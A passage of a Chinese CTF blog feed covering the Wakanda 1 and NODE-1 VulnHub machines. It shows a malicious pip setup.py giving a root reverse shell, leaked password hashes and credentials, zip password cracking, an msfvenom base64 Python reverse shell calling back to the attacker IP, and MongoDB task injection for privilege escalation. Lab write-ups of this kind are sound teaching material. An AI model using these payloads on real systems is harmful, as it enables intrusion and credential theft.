class="line">Document root is /home/kali-team/GitHub/FakePip</span><br><span class="line">Press Ctrl-C to quit.</span><br><span class="line">[Tue Oct 16 21:41:37 2018] 192.168.56.101:45377 [200]: /setup.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">devops@Wakanda1:~$ wget http://192.168.56.1:4444/setup.py</span><br><span class="line">wget http://192.168.56.1:4444/setup.py</span><br><span class="line">--2018-10-16 09:41:36--  http://192.168.56.1:4444/setup.py</span><br><span class="line">Connecting to 192.168.56.1:4444... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 990 [application/octet-stream]</span><br><span class="line">Saving to: ‘setup.py’</span><br><span class="line"></span><br><span class="line">setup.py            100%[=====================&gt;]     990  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2018-10-16 09:41:36 (81.4 MB/s) - ‘setup.py’ saved [990/990]</span><br><span class="line"></span><br><span class="line">devops@Wakanda1:~$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt  setup.py</span><br></pre></td></tr></table></figure><ul><li>按照项目教程执行pip安装，再用nc监听等shell。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:~$ sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br><span class="line">sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br><span class="line">Unpacking /home/devops</span><br><span class="line">  Running setup.py (path:/tmp/pip-SfNBak-build/setup.py) egg_info <span class="keyword">for</span> package from file:///home/devops</span><br><span class="line">    </span><br><span class="line">Installing collected packages: FakePip</span><br><span class="line">  Found existing installation: FakePip 0.0.1</span><br><span class="line">    Uninstalling FakePip:</span><br><span class="line">      Successfully uninstalled FakePip</span><br><span class="line">  Running setup.py install <span class="keyword">for</span> FakePip</span><br></pre></td></tr></table></figure><ul><li>root的Flag到手。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  FakePip git:(master) ✗ nc -lvp 6666</span><br><span class="line">Connection from 192.168.56.101:46577</span><br><span class="line">root@Wakanda1:/tmp/pip-SfNBak-build<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Wakanda1:/tmp/pip-SfNBak-build<span class="comment"># cd    </span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@Wakanda1:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@Wakanda1:~<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line"> _    _.--.____.--._</span><br><span class="line">( )=.-<span class="string">":;:;:;;':;:;:;"</span>-._</span><br><span class="line"> \\\:;:;:;:;:;;:;::;:;:;:\</span><br><span class="line">  \\\:;:;:;:;:;;:;:;:;:;:;\</span><br><span class="line">   \\\:;::;:;:;:;:;::;:;:;:\</span><br><span class="line">    \\\:;:;:;:;:;;:;::;:;:;:\</span><br><span class="line">     \\\:;::;:;:;:;:;::;:;:;:\</span><br><span class="line">      \\\;;:;:_:--:_:_:--:_;:;\</span><br><span class="line">       \\\_.-<span class="string">"             "</span>-._\</span><br><span class="line">        \\</span><br><span class="line">         \\</span><br><span class="line">          \\</span><br><span class="line">           \\ Wakanda 1 - by @xMagass</span><br><span class="line">            \\</span><br><span class="line">             \\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations You are Root!</span><br><span class="line"></span><br><span class="line">821ae63dbe0c573eff8b69d451fb21bc</span><br><span class="line"></span><br><span class="line">root@Wakanda1:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-up-NODE-1</title>
      <link href="/2018/10/12/Write-up-NODE-1/"/>
      <url>/2018/10/12/Write-up-NODE-1/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li>下载地址：<a href="https://www.vulnhub.com/entry/node-1,252/" target="_blank" rel="noopener">点我</a></li><li>哔哩哔哩：<a href="https://www.bilibili.com/video/av33796982/" target="_blank" rel="noopener">哔哩哔哩</a></li></ul><h3 id="一天研究OBS终于不闪屏了"><a href="#一天研究OBS终于不闪屏了" class="headerlink" title="一天研究OBS终于不闪屏了"></a>一天研究OBS终于不闪屏了</h3><ul><li>顺便在这里记录一下，上网查了很久。刚刚开始是不闪屏了，但是锁屏后就唤醒不了了，只能强制关机。</li><li>然后又上网找了很久，重启了N次，终于试出来哪了的问题了。添加下面内容到这个文件重启就好了。</li></ul><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  cat /etc/X11/xorg.conf.d/20-intel.conf    </span><br><span class="line">Section "Device"</span><br><span class="line">    Identifier "Intel Graphics" </span><br><span class="line">    Driver "intel" </span><br><span class="line">    Option "AccelMethod" "uxa"</span><br><span class="line">    Option "DRI" "2"</span><br><span class="line">EndSection</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><h3 id="祖传开头"><a href="#祖传开头" class="headerlink" title="祖传开头"></a>祖传开头</h3><ul><li>网卡：vmnet8；IP：192.168.131.1/24</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vmnet8</span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.131.1/24 brd 192.168.131.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><ul><li>这次祖传套路好像不管用了，想是不是防火墙过滤了，然后尝试ByPass，详细可以看：<a href="https://kali-team.cn/2018/04/09/Nmap-%E6%89%AB%E6%8F%8F-%E9%98%B2%E7%81%AB%E5%A2%99-Bypass/" target="_blank" rel="noopener">Nmap防火墙ByPass</a></li><li>尝试到<code>sudo nmap -sn 192.168.131.1/24</code>加上sudo可以找到目标的IP，后面发现目标没有开放80或443端口，一般扫描无法找到目标IP。因为使用sudo权限Nmap会使用libpcap嗅探网络流量和发送原始网络流量，详细还是看上面的那篇文章吧。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn 192.168.131.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-12 20:26 CST</span><br><span class="line">Nmap scan report for 192.168.131.1</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">Nmap done: 256 IP addresses (1 host up) scanned in 3.08 seconds</span><br><span class="line">➜  ~ sudo nmap -sn 192.168.131.1/24</span><br><span class="line">[sudo] kali-team 的密码：</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-12 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.131.141</span><br><span class="line">Host is up (0.00074s latency).</span><br><span class="line">MAC Address: 00:0C:29:22:EE:8A (VMware)</span><br><span class="line">Nmap scan report for 192.168.131.1</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 35.66 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><ul><li>找到IP为192.168.131.141，-A接着扫，-Pn跳过主机发现直接扫，开放了22和3000端口，难怪扫不到。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -T4 -A 192.168.131.141 -Pn</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-12 20:43 CST</span><br><span class="line">Nmap scan report for 192.168.131.141</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)</span><br><span class="line">|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)</span><br><span class="line">|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">| hadoop-datanode-info: </span><br><span class="line">|_  Logs: /login</span><br><span class="line">| hadoop-tasktracker-info: </span><br><span class="line">|_  Logs: /login</span><br><span class="line">|_http-title: MyPlace</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.95 seconds</span><br></pre></td></tr></table></figure><ul><li>浏览器打开3000端口看一下，burpsuite全程抓包，到处点点。回来看请求记录。发现在日志里有几个奇怪的请求<code>http://192.168.131.141:3000/api/users/tom</code>都是json格式的。</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/users/tom</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.131.141:3000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.131.141:3000/profiles/tom</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><ul><li>返回数据，应该是在点用户的头像时请求的，试完首页的三个用户都不是管理员。猜想根据写路由的习惯，试着把用户删除掉再请求一次。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span>: Express</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 146</span><br><span class="line"><span class="attribute">ETag</span>: W/"92-i7KsecITBt58aCBrfJ2ziyXT+uA"</span><br><span class="line"><span class="attribute">Date</span>: Fri, 12 Oct 2018 12:54:18 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false&#125;</span><br></pre></td></tr></table></figure><ul><li>然后就出现了了另一个管理员用户<code>myP14ceAdm1nAcc0uNT</code>，密码丢去破解得到：<code>manchester</code></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/users</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.131.141:3000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.131.141:3000/profiles/tom</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span>: Express</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 611</span><br><span class="line"><span class="attribute">ETag</span>: W/"263-mJMXKDfX6c4pdWF3bLjHuBIvsM0"</span><br><span class="line"><span class="attribute">Date</span>: Fri, 12 Oct 2018 12:58:25 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">[&#123;"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true&#125;,&#123;"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false&#125;,&#123;"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false&#125;,&#123;"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false&#125;]</span><br></pre></td></tr></table></figure><ul><li>登录得到一个文件，下载回来判断文件类型发现是一个base64编码的纯文本，那再解码导出到文件在判断文件类型是一个zip。但是有密码加密的，所以要爆破zip密码。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD file myplace.backup</span><br><span class="line">myplace.backup: ASCII text, <span class="keyword">with</span> very <span class="keyword">long</span> <span class="keyword">lines</span>, <span class="keyword">with</span> <span class="keyword">no</span> line terminators</span><br><span class="line">➜  DOWNLOAD cat myplace.backup|base64 -d &gt;<span class="number">2333</span></span><br><span class="line">➜  DOWNLOAD <span class="keyword">file</span> <span class="number">2333</span> </span><br><span class="line"><span class="number">2333</span>: Zip <span class="keyword">archive</span> <span class="keyword">data</span>, <span class="keyword">at</span> <span class="keyword">least</span> v1<span class="number">.0</span> <span class="keyword">to</span> <span class="keyword">extract</span></span><br><span class="line">➜  DOWNLOAD unzip <span class="number">2333</span> </span><br><span class="line"><span class="keyword">Archive</span>:  <span class="number">2333</span></span><br><span class="line">   creating: <span class="keyword">var</span>/www/myplace/</span><br><span class="line">[<span class="number">2333</span>] <span class="keyword">var</span>/www/myplace/<span class="keyword">package</span>-lock.json <span class="keyword">password</span>:</span><br></pre></td></tr></table></figure><ul><li>用zip2john生产zip的hash文件，在用字典攻击。因为我在之前已经破解过一次了，他保存了记录。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD zip2john 2333 &gt; pass.hash</span><br><span class="line">➜  DOWNLOAD cat pass.hash </span><br><span class="line">2333:$pkzip2$3*2*1*0*8*24*9c88*1223*332809d8492f2345d28fa927fb76c77154c6ccf048881c2600290b53514f7d6c8413b7db*1*0*8*24*37ef*0145*e3ff6a50090c46ad3e53aee3d26d04dee08c2e9c0c1b2b48e7000ddc6a84210ba178b271*2*0*11*5*118f1dfc*94cb*67*0*11*118f*3d0f*e9a06a072dc45e9904cee2aa2fa97c9cd0*$/pkzip2$:::::2333</span><br><span class="line">➜  DOWNLOAD john pass.hash --wordlist=$wordlist </span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line">➜  DOWNLOAD john --show pass.hash</span><br><span class="line">2333:magicword:::::2333</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure><ul><li>我把记录删除了再演示一遍，如果再想看密码可以使用–show加hash文件查看。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD john pass.hash --wordlist=$wordlist</span><br><span class="line">Created directory: /home/kali-team/.john</span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">magicword        (2333)</span><br><span class="line">1g 0:00:00:00 DONE (2018-10-12 23:50) 5.882g/s 1156Kp/s 1156Kc/s 1156KC/s sandrea..piggy!</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><ul><li>解压进入文件夹找到app.js文件，发现了一些敏感的信息。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace';</span><br><span class="line">const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';</span><br></pre></td></tr></table></figure><ul><li>如果是想快一点的话可以直接使用上面的账号登录ssh上EXP提权到root权限GetFlag，如果想有点挑战的就使用下面的命令执行漏洞GetFlag，这样就不用EXP提权了。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.get('/api/admin/backup', function (req, res) &#123;</span><br><span class="line">    if (req.session.user &amp;&amp; req.session.user.is_admin) &#123;</span><br><span class="line">      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);</span><br><span class="line">      var backup = '';</span><br><span class="line"></span><br><span class="line">      proc.on("exit", function(exitCode) &#123;</span><br><span class="line">        res.header("Content-Type", "text/plain");</span><br><span class="line">        res.header("Content-Disposition", "attachment; filename=myplace.backup");</span><br><span class="line">        res.send(backup);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      proc.stdout.on("data", function(chunk) &#123;</span><br><span class="line">        backup += chunk;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      proc.stdout.on("end", function() &#123;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      res.send(&#123;</span><br><span class="line">        authenticated: false</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><ul><li>先登录ssh，账号：mark，密码：5AYRft73VtFpc84k</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD ssh mark@192.168.131.141</span><br><span class="line">mark@192.168.131.141's password: </span><br><span class="line">Last login: Fri Oct 12 17:15:41 2018 from 192.168.131.1</span><br><span class="line">mark@node:~$</span><br></pre></td></tr></table></figure><ul><li>先用msf生成一行Python的反弹后门，在用nc监听本地的7788端口。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD msfvenom -p cmd/unix/reverse_python <span class="attribute">lhost</span>=192.168.131.1 <span class="attribute">lport</span>=7788 R</span><br><span class="line">[-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::Unix <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: cmd <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 501 bytes</span><br><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCAgICAgICwgICBzdWJwcm9jZXNzICAgICAgLCAgIG9zICAgIDsgICBob3N0PSIxOTIuMTY4LjEzMS4xIiAgICA7ICAgcG9ydD03Nzg4ICAgIDsgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAsICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICA7ICAgcy5jb25uZWN0KChob3N0ICAgICAgLCAgIHBvcnQpKSAgICA7ICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgIDApICAgIDsgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgMSkgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAyKSAgICA7ICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))"</span></span><br><span class="line">➜  DOWNLOAD nc -lvp 7788</span><br></pre></td></tr></table></figure><ul><li>把shell上传到目标主机，加上可执行权限</li></ul><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/tmp$ chmod<span class="number"> 777 </span>shell.sh </span><br><span class="line">mark@node:/tmp$ ll</span><br><span class="line">total 64</span><br><span class="line">drwxrwxrwt <span class="number"> 9 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>17:26 ./</span><br><span class="line">drwxr-xr-x<span class="number"> 25 </span>root    root    <span class="number"> 4096 </span>Sep <span class="number"> 2 </span><span class="number"> 2017 </span>../</span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>mark    mark    <span class="number"> 6021 </span>Oct<span class="number"> 12 </span>15:19 44298.c</span><br><span class="line">-rwxrwxr-x <span class="number"> 1 </span>mark    mark   <span class="number"> 14032 </span>Oct<span class="number"> 12 </span>15:20 a.out*</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .font-unix/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .ICE-unix/</span><br><span class="line">srwx------ <span class="number"> 1 </span>mongodb nogroup    <span class="number"> 0 </span>Oct<span class="number"> 12 </span>13:20 mongodb-27017.sock=</span><br><span class="line">-rwxrwxrwx <span class="number"> 1 </span>mark    mark     <span class="number"> 502 </span>Oct<span class="number"> 12 </span>17:25 shell.sh*</span><br><span class="line">drwx------ <span class="number"> 3 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 systemd-private-712c42b4f5194056b7eb002b805a8bad-systemd-timesyncd.service-FZdDDZ/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .Test-unix/</span><br><span class="line">drwx------ <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 vmware-root/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .X11-unix/</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Oct<span class="number"> 12 </span>13:19 .XIM-unix/</span><br><span class="line">mark@node:/tmp$</span><br></pre></td></tr></table></figure><ul><li><p>利用app.js里的账号登录<code>mark@node:/tmp$ mongo -u mark -p5AYRft73VtFpc84k scheduler</code>mongodb添加任务执行反弹后门<code>db.tasks.insertOne({cmd:&quot;bash /tmp/shell.sh&quot;});</code>,要等一会儿。</p></li><li><p>然后反弹回来的就是tom用户的权限了，就可以拿到用户home目录的Flag了。</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwd </span><br><span class="line">/</span><br><span class="line">cd /home/tom</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">e1156acc3574e04b06908ecf76be91b1</span><br><span class="line"></span><br><span class="line">tom@node:~$ ls -al /usr/local/bin</span><br><span class="line">ls -al /usr/local/bin</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x  2 root root   4096 Sep  3  2017 .</span><br><span class="line">drwxr-xr-x 10 root root   4096 Aug 29  2017 ..</span><br><span class="line">-rwsr-xr--  1 root admin 16484 Sep  3  2017 backup</span><br><span class="line">tom@node:~$</span><br></pre></td></tr></table></figure><ul><li><p>接着再利用上面的备份的命令执行，就是但备份的时候会用root权限执行/usr/local/bin/backup程序，当我想着把root目录打包成备份拿到root目录下的root.txt时，发现自己太天真了。拿到了暴走的那张图。</p></li><li><p>想直接该掉目标的app.js又发现要root权限</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 